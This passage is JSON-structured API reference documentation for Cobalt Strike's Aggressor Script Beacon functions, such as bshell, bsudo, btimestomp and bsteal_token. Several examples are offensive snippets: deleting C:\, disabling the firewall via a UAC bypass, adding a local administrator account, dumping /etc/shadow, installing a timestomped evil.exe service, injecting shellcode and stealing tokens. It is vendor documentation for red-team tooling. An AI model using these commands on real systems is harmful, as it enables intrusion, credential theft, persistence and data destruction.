        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the path to the key"
      },
      {
        "param": "$3",
        "desc": "the name of the value to query"
      },
      {
        "param": "$4",
        "desc": "x86|x64 - which view of the registry to use"
      }
    ],
    "returns": "",
    "example": "alias winver {\nbreg_queryv($1, \"HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\", \"ProductName\", \"x86\");\n}",
    "notes": "",
    "signature": "breg_queryv",
    "anchors": [
      "breg_queryv"
    ]
  },
  "bremote_exec": {
    "description": "Ask Beacon to run a command on a remote target.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the remote execute method to use"
      },
      {
        "param": "$3",
        "desc": "the remote target"
      },
      {
        "param": "$4",
        "desc": "the command and arguments to run"
      }
    ],
    "returns": "",
    "example": "# winrm [target] [command+args]\nalias winrm-exec {\nbremote_exec($1, \"winrm\", $2, $3); {\n}\n\nSee also\n\n&beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &beacon_remote_exec_methods",
    "notes": "",
    "signature": "bremote_exec",
    "anchors": [
      "bremote_exec"
    ]
  },
  "brev2self": {
    "description": "Ask Beacon to drop its current token. This calls the RevertToSelf() Win32 API.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "alias rev2self {\nbrev2self($1);\n}",
    "notes": "",
    "signature": "brev2self",
    "anchors": [
      "brev2self"
    ]
  },
  "brm": {
    "description": "Ask Beacon to remove a file or folder.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the file or folder to remove"
      }
    ],
    "returns": "",
    "example": "# nuke the system\nbrm($1, \"c:\\\\\");",
    "notes": "",
    "signature": "brm",
    "anchors": [
      "brm"
    ]
  },
  "brportfwd": {
    "description": "Ask Beacon to setup a reverse port forward.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the port to bind to on the target"
      },
      {
        "param": "$3",
        "desc": "the host to forward connections to"
      },
      {
        "param": "$4",
        "desc": "the port to forward connections to"
      }
    ],
    "returns": "",
    "example": "brportfwd($1, 80, \"192.168.12.88\", 80);",
    "notes": "",
    "signature": "brportfwd",
    "anchors": [
      "brportfwd"
    ]
  },
  "brportfwd_local": {
    "description": "Ask Beacon to setup a reverse port forward that routes to the current Cobalt Strike client.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the port to bind to on the target"
      },
      {
        "param": "$3",
        "desc": "the host to forward connections to"
      },
      {
        "param": "$4",
        "desc": "the port to forward connections to"
      }
    ],
    "returns": "",
    "example": "brportfwd_local($1, 80, \"192.168.12.88\", 80);",
    "notes": "",
    "signature": "brportfwd_local",
    "anchors": [
      "brportfwd_local"
    ]
  },
  "brportfwd_stop": {
    "description": "Ask Beacon to stop a reverse port forward",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the port bound on the target"
      }
    ],
    "returns": "",
    "example": "brportfwd_stop($1, 80);",
    "notes": "",
    "signature": "brportfwd_stop",
    "anchors": [
      "brportfwd_stop"
    ]
  },
  "brun": {
    "description": "Ask Beacon to run a command",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command and arguments to run"
      }
    ],
    "returns": "",
    "example": "alias w {\nbrun($1, \"whoami /all\");\n}",
    "notes": "This capability is a simpler version of the &beacon_execute_job function. The latter function is what &bpowershell and &bshell build on. This is a (slightly) more OPSEC-safe option to run commands and receive output from them.",
    "signature": "brun",
    "anchors": [
      "brun"
    ]
  },
  "brunas": {
    "description": "Ask Beacon to run a command as another user.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the domain of the user"
      },
      {
        "param": "$3",
        "desc": "the user's username"
      },
      {
        "param": "$4",
        "desc": "the user's password"
      },
      {
        "param": "$5",
        "desc": "the command to run"
      }
    ],
    "returns": "",
    "example": "brunas($1, \"CORP\", \"Administrator\", \"toor\", \"notepad.exe\");",
    "notes": "",
    "signature": "brunas",
    "anchors": [
      "brunas"
    ]
  },
  "brunasadmin": {
    "description": "REMOVED Removed in Cobalt Strike 4.0. Use &belevate_command with psexec_psh option.\n\nAsk Beacon to run a command in a high-integrity context (bypasses UAC).",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command and its arguments."
      }
    ],
    "returns": "",
    "example": "# disable the firewall\nbrunasadmin($1, \"cmd.exe /C netsh advfirewall set allprofiles state off\");",
    "notes": "This command uses the Token Duplication UAC bypass. This bypass has a few requirements:\n\n- Your user must be a local admin\n\n- If Always Notify is enabled, an existing high integrity process must be running in the current desktop session.",
    "signature": "brunasadmin",
    "anchors": [
      "brunasadmin"
    ]
  },
  "brunu": {
    "description": "Ask Beacon to run a process under another process.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID of the parent process"
      },
      {
        "param": "$3",
        "desc": "the command + arguments to run"
      }
    ],
    "returns": "",
    "example": "brunu($1, 1234, \"notepad.exe\");",
    "notes": "",
    "signature": "brunu",
    "anchors": [
      "brunu"
    ]
  },
  "bscreenshot": {
    "description": "Ask Beacon to take a screenshot.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "(optional) the PID to inject the screenshot tool or $null"
      },
      {
        "param": "$3",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nitem \"&Screenshot\" {\nbinput($1, \"screenshot\");\nbscreenshot($1);\n}\n\nInject into the specified process\nbscreenshot($1, 1234, \"x64\");",
    "notes": "",
    "signature": "bscreenshot",
    "anchors": [
      "bscreenshot"
    ]
  },
  "bscreenwatch": {
    "description": "Ask Beacon to take periodic screenshots",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "(optional) the PID to inject the screenshot tool or $null"
      },
      {
        "param": "$3",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nitem \"&Screenwatch\" {\nbinput($1, \"screenwatch\");\nbscreenwatch($1);\n}\n\nInject into the specified process\nbscreenwatch($1, 1234, \"x64\");",
    "notes": "",
    "signature": "bscreenwatch",
    "anchors": [
      "bscreenwatch"
    ]
  },
  "bsetenv": {
    "description": "Ask Beacon to set an environment variable",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the environment variable to set"
      },
      {
        "param": "$3",
        "desc": "the value to set the environment variable to (specify $null to unset the variable)"
      }
    ],
    "returns": "",
    "example": "alias tryit {\nbsetenv($1, \"foo\", \"BAR!\");\nbshell($1, \"echo %foo%\");\n}",
    "notes": "",
    "signature": "bsetenv",
    "anchors": [
      "bsetenv"
    ]
  },
  "bshell": {
    "description": "Ask Beacon to run a command with cmd.exe",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command and arguments to run"
      }
    ],
    "returns": "",
    "example": "alias adduser {\nbshell($1, \"net user $2 B00gyW00gy1234! /ADD\");\nbshell($1, \"net localgroup \\\"Administrators\\\" $2 /ADD\");\n}",
    "notes": "",
    "signature": "bshell",
    "anchors": [
      "bshell"
    ]
  },
  "bshinject": {
    "description": "Inject shellcode (from a local file) into a specific process.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID of the process to inject into"
      },
      {
        "param": "$3",
        "desc": "the process architecture (x86 | x64)"
      },
      {
        "param": "$4",
        "desc": "the local file with the shellcode"
      }
    ],
    "returns": "",
    "example": "bshinject($1, 1234, \"x86\", \"/path/to/stuff.bin\");",
    "notes": "",
    "signature": "bshinject",
    "anchors": [
      "bshinject"
    ]
  },
  "bshspawn": {
    "description": "Spawn shellcode (from a local file) into another process. This function benefits from Beacon's configuration to spawn post-exploitation jobs (e.g., spawnto, ppid, etc.)",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the process architecture (x86 | x64)"
      },
      {
        "param": "$3",
        "desc": "the local file with the shellcode"
      }
    ],
    "returns": "",
    "example": "bshspawn($1, \"x86\", \"/path/to/stuff.bin\");",
    "notes": "",
    "signature": "bshspawn",
    "anchors": [
      "bshspawn"
    ]
  },
  "bsleep": {
    "description": "Ask Beacon to change its beaconing interval and jitter factor.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the number of seconds between beacons."
      },
      {
        "param": "$3",
        "desc": "the jitter factor [0-99]"
      }
    ],
    "returns": "",
    "example": "alias stealthy {\n# sleep for 1 hour with 30% jitter factor\nbsleep($1, 60 * 60, 30);\n}",
    "notes": "",
    "signature": "bsleep",
    "anchors": [
      "bsleep"
    ]
  },
  "bsleepu": {
    "description": "Ask Beacon to change its beaconing interval and jitter factor.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "beacon sleep period string."
      }
    ],
    "returns": "",
    "example": "alias stealthy {\n# sleep for 2 days 13 hours 45 minutes 8 seconds with 30% jitter factor\nbsleepu($1, \"2d 13h 45m 8s 30j\");\n}",
    "notes": "",
    "signature": "bsleepu",
    "anchors": [
      "bsleepu"
    ]
  },
  "bsocks": {
    "description": "Start a SOCKS proxy server associated with a beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the port to bind to"
      },
      {
        "param": "$3",
        "desc": "SOCKS version [SOCKS4|SOCKS5] Default: SOCKS4"
      },
      {
        "param": "$4",
        "desc": "enable/disable NoAuth authentication [enableNoAuth|disableNoAuth] Default: enableNoAuth"
      },
      {
        "param": "$5",
        "desc": "username for User/Password authentication [blank|username] Default: Blank"
      },
      {
        "param": "$6",
        "desc": "password for User/Password authentication [blank|password] Default: Blank"
      },
      {
        "param": "$7",
        "desc": "enable logging [enableLogging|disableLogging] Default: disableLogging"
      }
    ],
    "returns": "",
    "example": "alias socksPorts {\nbsocks($1, 10401);\nbsocks($1, 10402, \"SOCKS4\");\nbsocks($1, 10501, \"SOCKS5\");\nbsocks($1, 10502, \"SOCKS5\" \"enableNoAuth\", \"\", \"\", \"disableLogging\");\nbsocks($1, 10503, \"SOCKS5\" \"enableNoAuth\", \"myname\", \"mypassword\", \"disableLogging\");\nbsocks($1, 10504, \"SOCKS5\" \"disableNoAuth\", \"myname\", \"mypassword\", \"enableLogging\");\n}",
    "notes": "",
    "signature": "bsocks",
    "anchors": [
      "bsocks"
    ]
  },
  "bsocks_stop": {
    "description": "Stop SOCKS proxy servers associated with the specified Beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "alias stopsocks {\nbsocks_stop($1);\n}",
    "notes": "",
    "signature": "bsocks_stop",
    "anchors": [
      "bsocks_stop"
    ]
  },
  "bspawn": {
    "description": "Ask Beacon to spawn a new session",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the listener to target."
      },
      {
        "param": "$3",
        "desc": "the architecture to spawn a process for (defaults to current beacon arch)"
      }
    ],
    "returns": "",
    "example": "item \"&Spawn\" {\nopenPayloadHelper(lambda({\nbinput($bids, \"spawn x86 $1\");\nbspawn($bids, $1, \"x86\");\n}, $bids => $1));\n}",
    "notes": "",
    "signature": "bspawn",
    "anchors": [
      "bspawn"
    ]
  },
  "bspawnas": {
    "description": "Ask Beacon to spawn a session as another user.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the domain of the user"
      },
      {
        "param": "$3",
        "desc": "the user's username"
      },
      {
        "param": "$4",
        "desc": "the user's password"
      },
      {
        "param": "$5",
        "desc": "the listener to spawn"
      }
    ],
    "returns": "",
    "example": "bspawnas($1, \"CORP\", \"Administrator\", \"toor\", \"my-listener\");",
    "notes": "",
    "signature": "bspawnas",
    "anchors": [
      "bspawnas"
    ]
  },
  "bspawnto": {
    "description": "Change the default program Beacon spawns to inject capabilities into.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the architecture we're modifying the spawnto setting for (x86, x64)"
      },
      {
        "param": "$3",
        "desc": "the program to spawn"
      }
    ],
    "returns": "",
    "example": "# let's make everything lame.\non beacon_initial {\nbinput($1, \"prep session with new spawnto values.\");\nbspawnto($1, \"x86\", \"%windir%\\\\syswow64\\\\notepad.exe\");\nbspawnto($1, \"x64\", \"%windir%\\\\sysnative\\\\notepad.exe\");\n}",
    "notes": "The value you specify for spawnto must work from x86->x86, x86->x64, x64->x86, and x64->x86 contexts. This is tricky. Follow these rules and you'll be OK:\n\n1. Always specify the full path to the program you want Beacon to spawn for its post-ex jobs.\n\n2. Environment variables (e.g., %windir%) are OK within these paths.\n\n3. Do not specify %windir%\\system32 or c:\\windows\\system32 directly. Always use syswow64 (x86) and sysnative (x64). Beacon will adjust these values to system32 if it's necessary.\n\n4. For an x86 spawnto value, you must specify an x86 program. For an x64 spawnto value, you must specify an x64 program.",
    "signature": "bspawnto",
    "anchors": [
      "bspawnto"
    ]
  },
  "bspawnu": {
    "description": "Ask Beacon to spawn a session under another process.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the process to spawn this session under"
      },
      {
        "param": "$3",
        "desc": "the listener to spawn"
      }
    ],
    "returns": "",
    "example": "bspawnu($1, 1234, \"my-listener\");",
    "notes": "",
    "signature": "bspawnu",
    "anchors": [
      "bspawnu"
    ]
  },
  "bspunnel": {
    "description": "Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward)",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "- the architecture (e.g., x86, x64)"
      },
      {
        "param": "$3",
        "desc": "the host of the controller"
      },
      {
        "param": "$4",
        "desc": "the port of the controller"
      },
      {
        "param": "$5",
        "desc": "a file with position-independent code to execute in a temporary process."
      }
    ],
    "returns": "",
    "example": "bspunnel($1, \"x64\", \"127.0.0.1\", 4444, script_resource(\"agent.bin\"));",
    "notes": "",
    "signature": "bspunnel",
    "anchors": [
      "bspunnel"
    ]
  },
  "bspunnel_local": {
    "description": "Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward). Note: this reverse port forward tunnel traverses through the Beacon chain to the team server and, via the team server, out through the requesting Cobalt Strike client.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the architecture (e.g., x86, x64)"
      },
      {
        "param": "$3",
        "desc": "the host of the controller"
      },
      {
        "param": "$4",
        "desc": "the port of the controller"
      },
      {
        "param": "$5",
        "desc": "a file with position-independent code to execute in a temporary process."
      }
    ],
    "returns": "",
    "example": "bspunnel_local($1, \"x64\", \"127.0.0.1\", 4444, script_resource(\"agent.bin\"));",
    "notes": "",
    "signature": "bspunnel_local",
    "anchors": [
      "bspunnel_local"
    ]
  },
  "bssh": {
    "description": "Ask Beacon to spawn an SSH session.",
    "arguments": [
      {
        "param": "$1",
        "desc": "id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "IP address or hostname of the target"
      },
      {
        "param": "$3",
        "desc": "port (e.g., 22)"
      },
      {
        "param": "$4",
        "desc": "username"
      },
      {
        "param": "$5",
        "desc": "password"
      },
      {
        "param": "$6",
        "desc": "(optional) the PID to inject the SSH client into or $null"
      },
      {
        "param": "$7",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nbssh($1, \"172.16.20.128\", 22, \"root\", \"toor\");\n\nInject into the specified process\nbssh($1, \"172.16.20.128\", 22, \"root\", \"toor\", 1234, \"x64\");",
    "notes": "",
    "signature": "bssh",
    "anchors": [
      "bssh"
    ]
  },
  "bssh_key": {
    "description": "Ask Beacon to spawn an SSH session using the data from a key file. The key file needs to be in the PEM format. If the file is not in the PEM format then make a copy of the file and convert the copy with the following command:\n\n/usr/bin/ssh-keygen -f [/path/to/copy] -e -m pem -p",
    "arguments": [
      {
        "param": "$1",
        "desc": "id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "IP address or hostname of the target"
      },
      {
        "param": "$3",
        "desc": "port (e.g., 22)"
      },
      {
        "param": "$4",
        "desc": "username"
      },
      {
        "param": "$5",
        "desc": "key data (as a string)"
      },
      {
        "param": "$6",
        "desc": "(optional) the PID to inject the SSH client into or $null"
      },
      {
        "param": "$7",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      }
    ],
    "returns": "",
    "example": "alias myssh {\n$pid = $2;\n$arch = $3;\n$handle = openf(\"/path/to/key.pem\");\n$keydata = readb($handle, -1);\nclosef($handle);\n\nif ($pid >= 0 && ($arch eq \"x86\" || $arch eq \"x64\")) {\nbssh_key($1, \"172.16.20.128\", 22, \"root\", $keydata, $pid, $arch);\n} else {\nbssh_key($1, \"172.16.20.128\", 22, \"root\", $keydata);\n}\n};",
    "notes": "",
    "signature": "bssh_key",
    "anchors": [
      "bssh_key"
    ]
  },
  "bstage": {
    "description": "REMOVED This function is removed in Cobalt Strike 4.0. Use &beacon_stage_tcp or &beacon_stage_pipe to explicitly stage a payload. Use &beacon_link to link to it.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bstage",
    "anchors": [
      "bstage"
    ]
  },
  "bsteal_token": {
    "description": "Ask Beacon to steal a token from a process.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID to take the token from"
      }
    ],
    "returns": "",
    "example": "alias steal_token {\nbsteal_token($1, int($2));\n}",
    "notes": "",
    "signature": "bsteal_token",
    "anchors": [
      "bsteal_token"
    ]
  },
  "bsudo": {
    "description": "Ask Beacon to run a command via sudo (SSH sessions only)",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the session. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the password for the current user"
      },
      {
        "param": "$3",
        "desc": "the command and arguments to run"
      }
    ],
    "returns": "",
    "example": "# hashdump [password]\nssh_alias hashdump {\nbsudo($1, $2, \"cat /etc/shadow\");\n}",
    "notes": "",
    "signature": "bsudo",
    "anchors": [
      "bsudo"
    ]
  },
  "bsyscall_method": {
    "description": "Ask Beacon to change its syscall method.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the syscall method. Supported methods are:"
      }
    ],
    "returns": "",
    "example": "alias syscall_method {\nbsyscall_method($1, $2);\n}",
    "notes": "",
    "signature": "bsyscall_method",
    "anchors": [
      "bsyscall_method"
    ]
  },
  "btask": {
    "description": "Report a task acknowledgement for a Beacon. This task acknowledgement will also contribute to the narrative in Cobalt Strike's Activity Report and Sessions Report.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to post to"
      },
      {
        "param": "$2",
        "desc": "the text to post"
      },
      {
        "param": "$3",
        "desc": "a string with MITRE ATT&CK Tactic IDs. Use a comma and a space to specify multiple IDs in one string."
      }
    ],
    "returns": "",
    "example": "alias foo {\nbtask($1, \"User tasked beacon to foo\", \"T1015\");\n}",
    "notes": "",
    "signature": "btask",
    "anchors": [
      "btask"
    ]
  },
  "btimestomp": {
    "description": "Ask Beacon to change the file modified/accessed/created times to match another file.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the file to update timestamp values for"
      },
      {
        "param": "$3",
        "desc": "the file to grab timestamp values from"
      }
    ],
    "returns": "",
    "example": "alias persist {\nbcd($1, \"c:\\\\windows\\\\system32\");\nbupload($1, script_resource(\"evil.exe\"));\nbtimestomp($1, \"evil.exe\", \"cmd.exe\");\nbshell($1, 'sc create evil binpath= \"c:\\\\windows\\\\system32\\\\evil.exe\"');\nbshell($1, 'sc start evil');\n}",
    "notes": "",
    "signature": "btimestomp",
    "anchors": [
      "btimestomp"
    ]
  },
  "btoken_store_remove": {
    "description": "Ask Beacon to remove specific access tokens from the store.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the array of token IDs to remove."
      }
    ],
    "returns": "",
    "example": "alias token-store_remove {\nbtoken_store_remove($1, @(int($2)));\n}",
    "notes": "",
    "signature": "btoken_store_remove",
    "anchors": [
      "btoken_store_remove"
    ]
  },
  "btoken_store_remove_all": {
    "description": "Ask Beacon to remove all tokens from the store.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "alias token-store_remove_all {\nbtoken_store_remove_all($1);\n}",
    "notes": "",
    "signature": "btoken_store_remove_all",
    "anchors": [
      "btoken_store_remove_all"
    ]
  },
  "btoken_store_show": {
    "description": "Ask Beacon to print the tokens currently available in the token store.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "alias token-store_show {\nbtoken_store_show($1);\n}",
    "notes": "",
    "signature": "btoken_store_show",
    "anchors": [
      "btoken_store_show"
    ]
  },
  "btoken_store_steal": {
    "description": "Ask Beacon to steal a token and store it in the token store.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the array of PIDs to take the tokens from."
      },
      {
        "param": "$3",
        "desc": "the OpenProcessToken access mask."
      }
    ],
    "returns": "",
    "example": "alias token-store_steal {\nbtoken_store_steal($1, @(int($2)), 11);\n}",
    "notes": "",
    "signature": "btoken_store_steal",
    "anchors": [
      "btoken_store_steal"
    ]
  },
  "btoken_store_steal-use": {
    "description": "Ask Beacon to steal a token, store it and immediately apply it to the beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID to take the token from."
      },
      {
        "param": "$3",
        "desc": "the OpenProcessToken access mask."
      }
    ],
    "returns": "",
    "example": "alias token-store_steal_and_use {\nbtoken_store_steal_and_use($1, int($2), 11);\n}",
    "notes": "",
    "signature": "btoken_store_steal_and_use",
    "anchors": [
      "btoken_store_steal-use"
    ]
  },
  "btoken_store_use": {
    "description": "Ask Beacon to use a token from the token store.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the token ID."
      }
    ],
    "returns": "",
    "example": "alias token-store_use {\nbtoken_store_use($1, int($2));\n}",
    "notes": "",
    "signature": "btoken_store_use",
    "anchors": [
      "btoken_store_use"
    ]
  },
  "bunlink": {
    "description": "Ask Beacon to delink a Beacon its connected to over a TCP socket or named pipe.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the target host to unlink (specified as an IP address)"
      },
      {
        "param": "$3",
        "desc": "(optional) the PID of the target session to unlink"
      }
    ],
    "returns": "",
    "example": "bunlink($1, \"172.16.48.3\");",
    "notes": "",
    "signature": "bunlink",
    "anchors": [
      "bunlink"
    ]
  },
  "bupload": {
    "description": "Ask a Beacon to upload a file",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the local path to the file to upload"
      }
    ],
    "returns": "",
    "example": "bupload($1, script_resource(\"evil.exe\"));",
    "notes": "",
    "signature": "bupload",
    "anchors": [
      "bupload"
    ]
  },
  "bupload_raw": {
    "description": "Ask a Beacon to upload a file",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the remote file name of the file"
      },
      {
        "param": "$3",
        "desc": "the raw content of the file"
      },
      {
        "param": "$4",
        "desc": "(optional) the local path to the file (if there is one)"
      }
    ],
    "returns": "",
    "example": "$data = artifact(\"my-listener\", \"exe\");\nbupload_raw($1, \"\\\\\\\\DC\\\\C$\\\\foo.exe\", $data);",
    "notes": "",
    "signature": "bupload_raw",
    "anchors": [
      "bupload_raw"
    ]
  },
  "bwdigest": {
    "description": "REMOVED Removed in Cobalt Strike 4.0. Use &bmimikatz directly.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bwdigest",
    "anchors": [
      "bwdigest"
    ]
  },
  "bwinrm": {
    "description": "REMOVED Removed in Cobalt Strike 4.0. Use &bjump with winrm or winrm64 built-in options.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bwinrm",
    "anchors": [
      "bwinrm"
    ]
  },
  "bwmi": {
    "description": "REMOVED Removed in Cobalt Strike 4.0.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bwmi",
    "anchors": [
      "bwmi"
    ]
  },
  "call": {
    "description": "Issue a call to the team server.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the command name"
      },
      {
        "param": "$2",
        "desc": "a callback to receive a response to this request. The callback will receive two arguments. The first is the call name. The second is the response."
      }
    ],
    "returns": "",
    "example": "call(\"aggressor.ping\", { warn(@_); }, \"this is my value\");",
    "notes": "",
    "signature": "call",
    "anchors": [
      "call"
    ]
  },
  "closeClient": {
    "description": "Close the current Cobalt Strike team server connection.",
    "arguments": [],
    "returns": "",
    "example": "closeClient();",
    "notes": "",
    "signature": "closeClient",
    "anchors": [
      "closeClient"
    ]
  },
  "colorMenu": {
    "description": "Generate a Java Menu color selection component to set accent colors within Cobalt Strike's data model",
    "arguments": [
      {
        "param": "$1",
        "desc": "the prefix"
      },
      {
        "param": "$2",
        "desc": "an array of IDs to change colors for"
      }
    ],
    "returns": "",
    "example": "popup targets {\nmenu \"&Color\" {\ninsert_color_menu(colorMenu(\"targets\", $1));\n}\n}\n\nSee also\n\n&highlight",
    "notes": "",
    "signature": "colorMenu",
    "anchors": [
      "colorMenu"
    ]
  },
  "credential_add": {
    "description": "Add a credential to the data model",
    "arguments": [
      {
        "param": "$1",
        "desc": "username"
      },
      {
        "param": "$2",
        "desc": "password"
      },
      {
        "param": "$3",
        "desc": "realm"
      },
      {
        "param": "$4",
        "desc": "source"
      },
      {
        "param": "$5",
        "desc": "host"
      }
    ],
    "returns": "",
    "example": "command falsecreds {\nfor ($x = 0; $x < 100; $x++) {\ncredential_add(\"user $+ $x\", \"password $+ $x\");\n}\n}",
    "notes": "",
    "signature": "credential_add",
    "anchors": [
      "credential_add"
    ]
  },
  "credentials": {
    "description": "Returns a list of application credentials in Cobalt Strike's data model.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each credential entry.",
    "example": "printAll(credentials());",
    "notes": "",
    "signature": "credentials",
    "anchors": [
      "credentials"
    ]
  },
  "custom_event": {
    "description": "Broadcast a custom event to all Cobalt Strike clients.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the topic name"
      },
      {
        "param": "$2",
        "desc": "the event data"
      }
    ],
    "returns": "",
    "example": "custom_event(\"my-topic\", %(foo => 42, bar => \"hello\"));",
    "notes": "",
    "signature": "custom_event",
    "anchors": [
      "custom_event"
    ]
  },
  "custom_event_private": {
    "description": "Send a custom event to one specific Cobalt Strike client.",
    "arguments": [
      {
        "param": "$1",
        "desc": "who to send the custom event to"
      },
      {
        "param": "$2",
        "desc": "the topic name"
      },
      {
        "param": "$3",
        "desc": "the event data"
      }
    ],
    "returns": "",
    "example": "custom_event_private(\"neo\", \"my-topic\", 42);",
    "notes": "",
    "signature": "custom_event_private",
    "anchors": [
      "custom_event_private"
    ]
  },
  "data_keys": {
    "description": "List the query-able keys from Cobalt Strike's data model",
    "arguments": [],
    "returns": "A list of keys that you may query with &data_query",
    "example": "foreach $key (data_keys()) {\nprintln(\"\\n\\c4=== $key ===\\n\");\nprintln(data_query($key));\n}",
    "notes": "",
    "signature": "data_keys",
    "anchors": [
      "data_keys"
    ]
  },
  "data_query": {
    "description": "Queries Cobalt Strike's data model",
    "arguments": [
      {
        "param": "$1",
        "desc": "the key to pull from the data model"
      }
    ],
    "returns": "A Sleep representation of the queried data.",
    "example": "println(data_query(\"targets\"));",
    "notes": "",
    "signature": "data_query",
    "anchors": [
      "data_query"
    ]
  },
  "dbutton_action": {
    "description": "Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called. You may add multiple buttons to a dialog. Cobalt Strike will line these buttons up in a row and center them at the bottom of the dialog.",
